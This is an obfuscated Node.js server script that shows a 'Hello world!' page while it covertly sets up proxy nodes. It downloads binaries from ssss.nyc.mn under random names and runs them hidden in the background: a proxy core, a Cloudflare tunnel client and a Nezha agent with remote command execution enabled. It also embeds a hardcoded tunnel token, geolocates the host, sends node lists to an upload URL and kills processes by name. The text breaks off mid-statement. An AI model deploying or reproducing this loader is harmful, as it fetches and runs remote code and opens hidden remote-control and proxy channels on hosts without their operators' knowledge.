const _0x900c71=_0x5b25;(function(_0x57b6f3,_0x3604ec){const _0xc58590={_0x2ac549:0x1f5,_0x37aad3:0x22d,_0x1b281f:0x1d6,_0x1a0234:0x273,_0x5dbd73:0x1e1,_0x14a7a5:0x222,_0x23c5f0:0x270},_0x4e2502=_0x5b25,_0x2b02b5=_0x57b6f3();while(!![]){try{const _0xb0814e=parseInt(_0x4e2502(_0xc58590._0x2ac549))/0x1*(parseInt(_0x4e2502(_0xc58590._0x37aad3))/0x2)+-parseInt(_0x4e2502(_0xc58590._0x1b281f))/0x3*(parseInt(_0x4e2502(0x20e))/0x4)+parseInt(_0x4e2502(_0xc58590._0x1a0234))/0x5*(-parseInt(_0x4e2502(_0xc58590._0x5dbd73))/0x6)+parseInt(_0x4e2502(0x20a))/0x7+-parseInt(_0x4e2502(_0xc58590._0x14a7a5))/0x8+-parseInt(_0x4e2502(_0xc58590._0x23c5f0))/0x9+parseInt(_0x4e2502(0x21d))/0xa;if(_0xb0814e===_0x3604ec)break;else _0x2b02b5['push'](_0x2b02b5['shift']());}catch(_0x2fb614){_0x2b02b5['push'](_0x2b02b5['shift']());}}}(_0x1b4b,0x28128));const express=require(_0x900c71(0x204)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x900c71(0x26d)),{promisify}=require(_0x900c71(0x21e)),exec=promisify(require(_0x900c71(0x21b))['exec']),{execSync}=require(_0x900c71(0x21b)),UPLOAD_URL=process[_0x900c71(0x1f8)][_0x900c71(0x226)]||'',PROJECT_URL=process[_0x900c71(0x1f8)][_0x900c71(0x1e4)]||'',AUTO_ACCESS=process['env'][_0x900c71(0x220)]||![],FILE_PATH=process[_0x900c71(0x1f8)][_0x900c71(0x1d0)]||_0x900c71(0x245),SUB_PATH=process[_0x900c71(0x1f8)][_0x900c71(0x255)]||'lianj',PORT=process[_0x900c71(0x1f8)][_0x900c71(0x1d3)]||process[_0x900c71(0x1f8)]['PORT']||0xbb8,UUID=process[_0x900c71(0x1f8)][_0x900c71(0x1ce)]||_0x900c71(0x228),NEZHA_SERVER=process[_0x900c71(0x1f8)][_0x900c71(0x287)]||'',NEZHA_PORT=process[_0x900c71(0x1f8)][_0x900c71(0x278)]||'',NEZHA_KEY=process[_0x900c71(0x1f8)][_0x900c71(0x225)]||'',ARGO_DOMAIN=process[_0x900c71(0x1f8)][_0x900c71(0x20b)]||_0x900c71(0x28c),ARGO_AUTH=process[_0x900c71(0x1f8)]['ARGO_AUTH']||'eyJhIjoiMjVmZTNjZmQ4MTA1MTFjZjhkZGY4MTQwODMzNWMwMWQiLCJ0IjoiNjEwNjAwNmItZjVmOC00ODk4LTliMzUtZDMyNzZmYWY0MzQxIiwicyI6Ik9ETmhObVkyTnpJdE9EQTNNUzAwWlRBeExXSTNPV1F0WWpZek9UQmpNV1kxTUdGaCJ9',ARGO_PORT=process[_0x900c71(0x1f8)]['ARGO_PORT']||0x200a,CFIP=process[_0x900c71(0x1f8)][_0x900c71(0x23b)]||_0x900c71(0x214),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x900c71(0x1f8)][_0x900c71(0x28f)]||_0x900c71(0x28e);!fs[_0x900c71(0x208)](FILE_PATH)?(fs[_0x900c71(0x1f6)](FILE_PATH),console['log'](FILE_PATH+_0x900c71(0x260))):console[_0x900c71(0x1d2)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4e3bc2=_0x900c71,_0x290aae=_0x4e3bc2(0x24e);let _0x42316b='';for(let _0x4c52fb=0x0;_0x4c52fb<0x6;_0x4c52fb++){_0x42316b+=_0x290aae[_0x4e3bc2(0x265)](Math['floor'](Math['random']()*_0x290aae[_0x4e3bc2(0x224)]));}return _0x42316b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x1b4b(){const _0x3f3def=['length','NEZHA_KEY','UPLOAD_URL','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','4ecd77c9-139b-40ef-beb7-64e5a8d92985','config.yaml','del\x20/f\x20/q\x20','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/web','383074ZwrMMV','then','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,skip\x20running','filter','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','npm\x20running\x20error:\x20','127.0.0.1','error','2083','\x20-p\x20','Subscription\x20uploaded\x20successfully','readFileSync','Unhandled\x20error\x20in\x20startserver:','CFIP','/sub.txt\x20saved\x20successfully','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/dev/null','writeFileSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','amd','direct','join','./tmp','?encryption=none&security=tls&sni=','isFile','test','countryCode','Error\x20executing\x20command:\x20','config.json','platform','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','abcdefghijklmnopqrstuvwxyz','sub.txt','/vmess-argo','ARGO_DOMAIN:','substring','tcp','response','SUB_PATH','--tls','boot.log','block','list.txt','success','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','win32','&path=%2Fvless-argo%3Fed%3D2560#','quic','\x20>/dev/null\x202>&1','\x20is\x20created','TunnelSecret','http://ip-api.com/json/','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','org','charAt','unshift','https://amd64.ssss.nyc.mn/v1','vless','/vless-argo','trojan','tls','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','path','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlinkSync','2088279oeFItI','aarch64','post','199245KMDxar','finish','application/json','get','pipe','NEZHA_PORT','stream','\x0a\x0avmess://','App\x20is\x20running','split','\x20successfully','Unknown','false','data','toString','\x20failed:\x20','Skipping\x20adding\x20automatic\x20access\x20task','rm\x20-rf\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','http\x20server\x20is\x20running\x20on\x20port:','NEZHA_SERVER','catch','taskkill\x20/f\x20/im\x20','\x0aclient_secret:\x20','set','koyytu.mjko.pp.ua','Add\x20automatic\x20access\x20task\x20faild:\x20','koybe','NAME','UUID','https://arm64.ssss.nyc.mn/v1','FILE_PATH','https://arm64.ssss.nyc.mn/bot','log','SERVER_PORT','blackhole','chmod','178257loeLHC','stringify','Error\x20reading\x20boot.log:','all','from','send','Error\x20downloading\x20files:','forEach','\x20-c\x20','utf-8','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','24aRDIhF','&path=%2Ftrojan-argo%3Fed%3D2560#','/trojan-argo','PROJECT_URL','https://amd64.ssss.nyc.mn/web','https://oooo.serv00.net/add-url','Download\x20','country_code','none','Empowerment\x20success\x20for\x20','?security=tls&sni=','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Nodes\x20uploaded\x20successfully','/vmess-argo?ed=2560','2053','statSync','unlink','text/plain;\x20charset=utf-8','.exe\x20>\x20nul\x202>&1','arm','1SYuXTK','mkdirSync','pkill\x20-f\x20\x22[','env','\x20-s\x20','Error\x20in\x20startserver:','/api/delete-nodes','443','\x20is\x20running','vmess','/config.json\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','map','push','\x0avless://','express','fileName','nohup\x20','/tunnel.yml\x20run','existsSync','base64','2224243zFqZWe','ARGO_DOMAIN','Content-Type','http','16OpNeLM','2096','tunnel.json','/api/add-subscriptions','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','web\x20running\x20error:\x20','cdns.doon.eu.org','match','message','clear','status','php\x20running\x20error:\x20','\x20>/dev/null\x202>&1\x20&','child_process','has','3315020pPRyBC','util','basename','AUTO_ACCESS','&fp=firefox&type=ws&host=','380392Rikwvs','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'];_0x1b4b=function(){return _0x3f3def;};return _0x1b4b();}let npmPath=path[_0x900c71(0x244)](FILE_PATH,npmName),phpPath=path[_0x900c71(0x244)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x900c71(0x244)](FILE_PATH,_0x900c71(0x24f)),listPath=path[_0x900c71(0x244)](FILE_PATH,_0x900c71(0x259)),bootLogPath=path[_0x900c71(0x244)](FILE_PATH,_0x900c71(0x257)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x24d96a={_0x4c19d4:0x224,_0xf7b5c0:0x272,_0x50bfaa:0x1fb,_0x3123c2:0x1d7},_0x1e315a=_0x900c71;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xde8a69;try{_0xde8a69=fs['readFileSync'](subPath,_0x1e315a(0x1df));}catch{return null;}const _0x3b5398=Buffer['from'](_0xde8a69,_0x1e315a(0x209))[_0x1e315a(0x281)](_0x1e315a(0x1df)),_0x11485d=_0x3b5398[_0x1e315a(0x27c)]('\x0a')[_0x1e315a(0x231)](_0x405f9c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1e315a(0x248)](_0x405f9c));if(_0x11485d[_0x1e315a(_0x24d96a._0x4c19d4)]===0x0)return;return axios[_0x1e315a(_0x24d96a._0xf7b5c0)](UPLOAD_URL+_0x1e315a(_0x24d96a._0x50bfaa),JSON[_0x1e315a(_0x24d96a._0x3123c2)]({'nodes':_0x11485d}),{'headers':{'Content-Type':_0x1e315a(0x275)}})['catch'](_0x2f77e9=>{return null;}),null;}catch(_0x602229){return null;}}function cleanupOldFiles(){const _0xa3ae68={_0x356b65:0x244,_0x121b7c:0x1f0},_0xe4e8e5=_0x900c71;try{const _0x1614f4=fs['readdirSync'](FILE_PATH);_0x1614f4[_0xe4e8e5(0x1dd)](_0x558ace=>{const _0x332a9e=_0xe4e8e5,_0x9de2f4=path[_0x332a9e(_0xa3ae68._0x356b65)](FILE_PATH,_0x558ace);try{const _0x57aba2=fs[_0x332a9e(_0xa3ae68._0x121b7c)](_0x9de2f4);_0x57aba2[_0x332a9e(0x247)]()&&fs[_0x332a9e(0x26f)](_0x9de2f4);}catch(_0x4a50ab){}});}catch(_0x2e0074){}}app[_0x900c71(0x276)]('/',function(_0x5603e2,_0x5d5df0){const _0x136921=_0x900c71;_0x5d5df0[_0x136921(0x1db)]('Hello\x20world!');});async function generateConfig(){const _0x128155={_0x3439b7:0x268,_0x122e66:0x269,_0x3d913a:0x234,_0x20ce60:0x234,_0x28ceb8:0x268,_0x292035:0x1e9,_0x536bcf:0x269,_0x13a283:0x26b,_0x296ef5:0x1fe,_0xeb50da:0x26a,_0x364955:0x1e3,_0x290ecf:0x243,_0x12a05d:0x1d4,_0x94b352:0x1d7},_0x56b57c=_0x900c71,_0x432694={'log':{'access':_0x56b57c(0x23f),'error':_0x56b57c(0x23f),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x56b57c(_0x128155._0x3439b7),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x56b57c(0x1e9),'fallbacks':[{'dest':0xbb9},{'path':_0x56b57c(_0x128155._0x122e66),'dest':0xbba},{'path':_0x56b57c(0x250),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x56b57c(0x253)}},{'port':0xbb9,'listen':_0x56b57c(_0x128155._0x3d913a),'protocol':_0x56b57c(_0x128155._0x3439b7),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x56b57c(0x253),'security':'none'}},{'port':0xbba,'listen':_0x56b57c(_0x128155._0x20ce60),'protocol':_0x56b57c(_0x128155._0x28ceb8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x56b57c(_0x128155._0x292035)},'streamSettings':{'network':'ws','security':_0x56b57c(_0x128155._0x292035),'wsSettings':{'path':_0x56b57c(_0x128155._0x536bcf)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x56b57c(_0x128155._0x13a283),_0x56b57c(0x25e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x56b57c(_0x128155._0x3d913a),'protocol':_0x56b57c(_0x128155._0x296ef5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x56b57c(0x250)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x56b57c(0x26b),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x56b57c(_0x128155._0x20ce60),'protocol':_0x56b57c(_0x128155._0xeb50da),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x56b57c(0x1e9),'wsSettings':{'path':_0x56b57c(_0x128155._0x364955)}},'sniffing':{'enabled':!![],'destOverride':[_0x56b57c(0x20d),_0x56b57c(_0x128155._0x13a283),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x56b57c(0x22b)]},'outbounds':[{'protocol':'freedom','tag':_0x56b57c(_0x128155._0x290ecf)},{'protocol':_0x56b57c(_0x128155._0x12a05d),'tag':_0x56b57c(0x258)}]};fs[_0x56b57c(0x240)](path[_0x56b57c(0x244)](FILE_PATH,_0x56b57c(0x24b)),JSON[_0x56b57c(_0x128155._0x94b352)](_0x432694,null,0x2));}function getSystemArchitecture(){const _0x3a60f3=_0x900c71,_0x22f42c=os['arch']();return _0x22f42c===_0x3a60f3(0x1f4)||_0x22f42c==='arm64'||_0x22f42c===_0x3a60f3(0x271)?'arm':_0x3a60f3(0x242);}function downloadFile(_0x5b0d4e,_0x11746f,_0x1fe597){const _0x99e7a4={_0x22dd7d:0x279,_0x172d15:0x22e},_0x58c5cf={_0x1e4d43:0x21f,_0x34f0cb:0x282,_0xd829c0:0x216,_0x464ddc:0x235},_0x4fc7ca={_0x2def9a:0x1f1,_0x2b5f90:0x1e7},_0x3455b0=_0x900c71,_0x44fbc0=_0x5b0d4e;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x187e01=fs['createWriteStream'](_0x44fbc0);axios({'method':'get','url':_0x11746f,'responseType':_0x3455b0(_0x99e7a4._0x22dd7d)})[_0x3455b0(_0x99e7a4._0x172d15)](_0x3d5251=>{const _0x129530={_0x230615:0x21f},_0x204133=_0x3455b0;_0x3d5251['data'][_0x204133(0x277)](_0x187e01),_0x187e01['on'](_0x204133(0x274),()=>{const _0x47cdab=_0x204133;_0x187e01['close'](),console['log']('Download\x20'+path[_0x47cdab(_0x129530._0x230615)](_0x44fbc0)+_0x47cdab(0x27d)),_0x1fe597(null,_0x44fbc0);}),_0x187e01['on'](_0x204133(0x235),_0x294f3c=>{const _0x2de940=_0x204133;fs[_0x2de940(_0x4fc7ca._0x2def9a)](_0x44fbc0,()=>{});const _0x4ddb6b=_0x2de940(_0x4fc7ca._0x2b5f90)+path[_0x2de940(0x21f)](_0x44fbc0)+_0x2de940(0x282)+_0x294f3c[_0x2de940(0x216)];console['error'](_0x4ddb6b),_0x1fe597(_0x4ddb6b);});})['catch'](_0x4e2133=>{const _0x151daa=_0x3455b0,_0x17a1cc=_0x151daa(0x1e7)+path[_0x151daa(_0x58c5cf._0x1e4d43)](_0x44fbc0)+_0x151daa(_0x58c5cf._0x34f0cb)+_0x4e2133[_0x151daa(_0x58c5cf._0xd829c0)];console[_0x151daa(_0x58c5cf._0x464ddc)](_0x17a1cc),_0x1fe597(_0x17a1cc);});}async function downloadFilesAndRun(){const _0x310049={_0x4f190a:0x224,_0x24f999:0x201,_0x1d356d:0x235,_0x227fa1:0x1dc,_0x137497:0x27c,_0x10e0ad:0x23d,_0x54a9fe:0x1ef,_0x3b403d:0x21c,_0x379f74:0x28a,_0x58f3c5:0x200,_0x5c04be:0x26c,_0x37afde:0x212,_0x5d5ac0:0x229,_0x37bf08:0x219,_0x2608db:0x1fc,_0x3338e1:0x20f,_0x153620:0x23d,_0x5464e1:0x206,_0x57a920:0x1f9,_0x39cafe:0x22f,_0x59742a:0x1d2,_0x5eb94a:0x233,_0x40b167:0x230,_0x8851a9:0x1ff,_0x529bd7:0x213,_0x1056fc:0x215,_0x186aed:0x227,_0x589de1:0x207,_0xe8740:0x206,_0x45a8f7:0x1fd},_0x1d791c={_0x5e88fb:0x205},_0x11cd0b=_0x900c71,_0x4c26e0=getSystemArchitecture(),_0x29b216=getFilesForArchitecture(_0x4c26e0);if(_0x29b216[_0x11cd0b(_0x310049._0x4f190a)]===0x0){console['log'](_0x11cd0b(0x24d));return;}const _0x52d556=_0x29b216[_0x11cd0b(_0x310049._0x24f999)](_0x21ef8a=>{return new Promise((_0x1a119b,_0x165408)=>{const _0x3c3a1b=_0x5b25;downloadFile(_0x21ef8a[_0x3c3a1b(_0x1d791c._0x5e88fb)],_0x21ef8a['fileUrl'],(_0x4ff52b,_0x4fb676)=>{_0x4ff52b?_0x165408(_0x4ff52b):_0x1a119b(_0x4fb676);});});});try{await Promise[_0x11cd0b(0x1d9)](_0x52d556);}catch(_0x263389){console[_0x11cd0b(_0x310049._0x1d356d)](_0x11cd0b(_0x310049._0x227fa1),_0x263389);return;}function _0x51d568(_0x282c2c){const _0x666ffc={_0x5e3a0b:0x235},_0x385415=_0x11cd0b,_0x331fcd=0x1fd;_0x282c2c[_0x385415(0x1dd)](_0x25c6ad=>{const _0x257601=_0x385415;fs['existsSync'](_0x25c6ad)&&fs[_0x257601(0x1d5)](_0x25c6ad,_0x331fcd,_0x3bb013=>{const _0x5781f3=_0x257601;_0x3bb013?console[_0x5781f3(_0x666ffc._0x5e3a0b)]('Empowerment\x20failed\x20for\x20'+_0x25c6ad+':\x20'+_0x3bb013):console['log'](_0x5781f3(0x1ea)+_0x25c6ad+':\x20'+_0x331fcd[_0x5781f3(0x281)](0x8));});});}const _0x2a0bfa=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x51d568(_0x2a0bfa);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x487805=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x11cd0b(_0x310049._0x137497)](':')['pop']():'',_0x4ebfe8=new Set([_0x11cd0b(0x1fc),'8443',_0x11cd0b(0x20f),_0x11cd0b(_0x310049._0x10e0ad),_0x11cd0b(0x236),_0x11cd0b(_0x310049._0x54a9fe)]),_0x4adf5a=_0x4ebfe8[_0x11cd0b(_0x310049._0x3b403d)](_0x487805)?'true':_0x11cd0b(0x27f),_0x4a371b=_0x11cd0b(_0x310049._0x379f74)+NEZHA_KEY+_0x11cd0b(_0x310049._0x58f3c5)+NEZHA_SERVER+_0x11cd0b(_0x310049._0x5c04be)+_0x4adf5a+_0x11cd0b(_0x310049._0x37afde)+UUID;fs['writeFileSync'](path[_0x11cd0b(0x244)](FILE_PATH,_0x11cd0b(_0x310049._0x5d5ac0)),_0x4a371b);const _0x302532=_0x11cd0b(0x206)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x11cd0b(0x1e0);try{await exec(_0x302532),console['log'](phpName+_0x11cd0b(0x1fd)),await new Promise(_0x2aaa72=>setTimeout(_0x2aaa72,0x3e8));}catch(_0x1d9520){console['error'](_0x11cd0b(_0x310049._0x37bf08)+_0x1d9520);}}else{let _0x393a4f='';const _0x19f63b=[_0x11cd0b(_0x310049._0x2608db),'8443',_0x11cd0b(_0x310049._0x3338e1),_0x11cd0b(_0x310049._0x153620),_0x11cd0b(0x236),_0x11cd0b(_0x310049._0x54a9fe)];_0x19f63b['includes'](NEZHA_PORT)&&(_0x393a4f=_0x11cd0b(0x256));const _0x245696=_0x11cd0b(_0x310049._0x5464e1)+npmPath+_0x11cd0b(_0x310049._0x57a920)+NEZHA_SERVER+':'+NEZHA_PORT+_0x11cd0b(0x237)+NEZHA_KEY+'\x20'+_0x393a4f+_0x11cd0b(_0x310049._0x39cafe);try{await exec(_0x245696),console[_0x11cd0b(_0x310049._0x59742a)](npmName+'\x20is\x20running'),await new Promise(_0x4de3c=>setTimeout(_0x4de3c,0x3e8));}catch(_0x191092){console[_0x11cd0b(_0x310049._0x1d356d)](_0x11cd0b(_0x310049._0x5eb94a)+_0x191092);}}}else console[_0x11cd0b(_0x310049._0x59742a)](_0x11cd0b(_0x310049._0x40b167));const _0x1108aa=_0x11cd0b(_0x310049._0x5464e1)+webPath+_0x11cd0b(0x1de)+FILE_PATH+_0x11cd0b(_0x310049._0x8851a9);try{await exec(_0x1108aa),console[_0x11cd0b(0x1d2)](webName+_0x11cd0b(0x1fd)),await new Promise(_0x51dc01=>setTimeout(_0x51dc01,0x3e8));}catch(_0x5babfe){console['error'](_0x11cd0b(_0x310049._0x529bd7)+_0x5babfe);}if(fs['existsSync'](botPath)){let _0x4bfa31;if(ARGO_AUTH[_0x11cd0b(_0x310049._0x1056fc)](/^[A-Z0-9a-z=]{120,250}$/))_0x4bfa31=_0x11cd0b(0x23e)+ARGO_AUTH;else ARGO_AUTH[_0x11cd0b(0x215)](/TunnelSecret/)?_0x4bfa31=_0x11cd0b(_0x310049._0x186aed)+FILE_PATH+_0x11cd0b(_0x310049._0x589de1):_0x4bfa31=_0x11cd0b(0x263)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x11cd0b(_0x310049._0xe8740)+botPath+'\x20'+_0x4bfa31+'\x20>/dev/null\x202>&1\x20&'),console[_0x11cd0b(0x1d2)](botName+_0x11cd0b(_0x310049._0x45a8f7)),await new Promise(_0x1db944=>setTimeout(_0x1db944,0x7d0));}catch(_0x1b67d7){console['error']('Error\x20executing\x20command:\x20'+_0x1b67d7);}}await new Promise(_0x18f7d9=>setTimeout(_0x18f7d9,0x1388));}function getFilesForArchitecture(_0x326411){const _0x48d6ea={_0x368b42:0x22c,_0x589872:0x1e5},_0x4e6412=_0x900c71;let _0x43a536;_0x326411===_0x4e6412(0x1f4)?_0x43a536=[{'fileName':webPath,'fileUrl':_0x4e6412(_0x48d6ea._0x368b42)},{'fileName':botPath,'fileUrl':_0x4e6412(0x1d1)}]:_0x43a536=[{'fileName':webPath,'fileUrl':_0x4e6412(_0x48d6ea._0x589872)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3151ac=_0x326411==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x43a536['unshift']({'fileName':npmPath,'fileUrl':_0x3151ac});}else{const _0x9ff541=_0x326411==='arm'?_0x4e6412(0x1cf):_0x4e6412(0x267);_0x43a536[_0x4e6412(0x266)]({'fileName':phpPath,'fileUrl':_0x9ff541});}}return _0x43a536;}function argoType(){const _0x1f1e2a={_0x1c0108:0x261,_0x38e2eb:0x210,_0x7caf14:0x232,_0x392d0b:0x285,_0x530b60:0x1d2},_0x38a552=_0x900c71;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x38a552(0x1d2)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x38a552(_0x1f1e2a._0x1c0108))){fs[_0x38a552(0x240)](path[_0x38a552(0x244)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x393085='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x38a552(0x27c)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x38a552(_0x1f1e2a._0x38e2eb))+_0x38a552(_0x1f1e2a._0x7caf14)+ARGO_DOMAIN+_0x38a552(0x25b)+ARGO_PORT+_0x38a552(_0x1f1e2a._0x392d0b);fs[_0x38a552(0x240)](path['join'](FILE_PATH,'tunnel.yml'),_0x393085);}else console[_0x38a552(_0x1f1e2a._0x530b60)](_0x38a552(0x241));}function _0x5b25(_0x2e78b3,_0x3e7d2b){const _0x1b4bfd=_0x1b4b();return _0x5b25=function(_0x5b259f,_0x2d5455){_0x5b259f=_0x5b259f-0x1ce;let _0x2ce688=_0x1b4bfd[_0x5b259f];return _0x2ce688;},_0x5b25(_0x2e78b3,_0x3e7d2b);}async function extractDomains(){const _0x374f6d={_0x43cddc:0x1d2,_0xe1d59d:0x251,_0x4f360e:0x257,_0x4d1e4c:0x27c,_0x363117:0x1dd,_0x3d693b:0x1d2,_0xac0699:0x1ec,_0x5e12db:0x244,_0x45e7ac:0x257,_0x206496:0x26e,_0x14b1e9:0x206,_0x56ee1a:0x21a,_0x4b9e28:0x235},_0x54e70a={_0x4d1829:0x280,_0x2f3f77:0x280,_0x1af0bb:0x280,_0x3158eb:0x1e8,_0x490e6b:0x276,_0x2a9c3f:0x280,_0x406340:0x249,_0xe2306c:0x280,_0x1ceb8e:0x27e},_0x32198d={_0x3ba05d:0x1f7,_0x5781af:0x265},_0x12cb96=_0x900c71;let _0x37def9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x37def9=ARGO_DOMAIN,console[_0x12cb96(_0x374f6d._0x43cddc)](_0x12cb96(_0x374f6d._0xe1d59d),_0x37def9),await _0x5c8404(_0x37def9);else try{const _0x55883e=fs[_0x12cb96(0x239)](path['join'](FILE_PATH,_0x12cb96(_0x374f6d._0x4f360e)),'utf-8'),_0x107dc8=_0x55883e[_0x12cb96(_0x374f6d._0x4d1e4c)]('\x0a'),_0x4de770=[];_0x107dc8[_0x12cb96(_0x374f6d._0x363117)](_0x318205=>{const _0x15f1a1=_0x12cb96,_0x2975da=_0x318205['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2975da){const _0x5890c2=_0x2975da[0x1];_0x4de770[_0x15f1a1(0x202)](_0x5890c2);}});if(_0x4de770[_0x12cb96(0x224)]>0x0)_0x37def9=_0x4de770[0x0],console[_0x12cb96(0x1d2)]('ArgoDomain:',_0x37def9),await _0x5c8404(_0x37def9);else{console[_0x12cb96(_0x374f6d._0x3d693b)](_0x12cb96(_0x374f6d._0xac0699)),fs['unlinkSync'](path[_0x12cb96(_0x374f6d._0x5e12db)](FILE_PATH,_0x12cb96(_0x374f6d._0x45e7ac)));async function _0x538dbf(){const _0x472b50=_0x12cb96;try{process[_0x472b50(0x24c)]==='win32'?await exec(_0x472b50(0x289)+botName+_0x472b50(0x1f3)):await exec(_0x472b50(_0x32198d._0x3ba05d)+botName[_0x472b50(_0x32198d._0x5781af)](0x0)+']'+botName[_0x472b50(0x252)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4ae152){}}_0x538dbf(),await new Promise(_0x51c705=>setTimeout(_0x51c705,0xbb8));const _0x264871='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x12cb96(_0x374f6d._0x206496)+ARGO_PORT;try{await exec(_0x12cb96(_0x374f6d._0x14b1e9)+botPath+'\x20'+_0x264871+_0x12cb96(_0x374f6d._0x56ee1a)),console[_0x12cb96(0x1d2)](botName+_0x12cb96(0x1fd)),await new Promise(_0x725f6f=>setTimeout(_0x725f6f,0xbb8)),await extractDomains();}catch(_0x550fa7){console[_0x12cb96(_0x374f6d._0x4b9e28)](_0x12cb96(0x24a)+_0x550fa7);}}}catch(_0x168ad6){console['error'](_0x12cb96(0x1d8),_0x168ad6);}async function _0x24d48a(){const _0x15f5f0=_0x12cb96;try{const _0x18b613=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x18b613[_0x15f5f0(_0x54e70a._0x4d1829)]&&_0x18b613[_0x15f5f0(0x280)][_0x15f5f0(0x1e8)]&&_0x18b613[_0x15f5f0(_0x54e70a._0x2f3f77)][_0x15f5f0(0x264)])return _0x18b613[_0x15f5f0(_0x54e70a._0x1af0bb)][_0x15f5f0(_0x54e70a._0x3158eb)]+'_'+_0x18b613[_0x15f5f0(_0x54e70a._0x2f3f77)][_0x15f5f0(0x264)];}catch(_0x520fe4){try{const _0x25209a=await axios[_0x15f5f0(_0x54e70a._0x490e6b)](_0x15f5f0(0x262),{'timeout':0xbb8});if(_0x25209a[_0x15f5f0(_0x54e70a._0x4d1829)]&&_0x25209a[_0x15f5f0(_0x54e70a._0x2a9c3f)]['status']===_0x15f5f0(0x25a)&&_0x25209a[_0x15f5f0(0x280)][_0x15f5f0(0x249)]&&_0x25209a['data'][_0x15f5f0(0x264)])return _0x25209a['data'][_0x15f5f0(_0x54e70a._0x406340)]+'_'+_0x25209a[_0x15f5f0(_0x54e70a._0xe2306c)][_0x15f5f0(0x264)];}catch(_0x4dc916){}}return _0x15f5f0(_0x54e70a._0x1ceb8e);}async function _0x5c8404(_0x33f45b){const _0x47dcfc={_0x122ee3:0x1e9,_0x2ffc4a:0x25d,_0x615c17:0x27a,_0x1f577a:0x1d7,_0x2a9cd6:0x281,_0x1377dd:0x1e2,_0x2ee668:0x1d2,_0x571ec3:0x281,_0x464fca:0x209,_0x32317c:0x240,_0x153e40:0x23c},_0x225af7=await _0x24d48a(),_0x501643=NAME?NAME+'-'+_0x225af7:_0x225af7;return new 